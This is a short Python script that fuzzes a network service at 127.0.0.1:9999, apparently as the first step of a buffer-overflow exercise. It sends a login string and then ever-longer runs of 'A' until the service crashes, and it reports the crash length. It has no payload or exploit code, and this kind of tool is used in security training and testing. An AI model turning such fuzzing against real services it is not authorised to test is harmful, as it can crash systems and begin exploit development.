#!/bin/env python3

import socket, time, sys

ip = "127.0.0.1"

port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      s.send(bytes('admin',"latin-1"))
      s.recv(1024)
      while True:
        print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
        s.send(bytes(string, "latin-1"))
        s.recv(1024)
        string += 100 * "A"
        time.sleep(1)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)

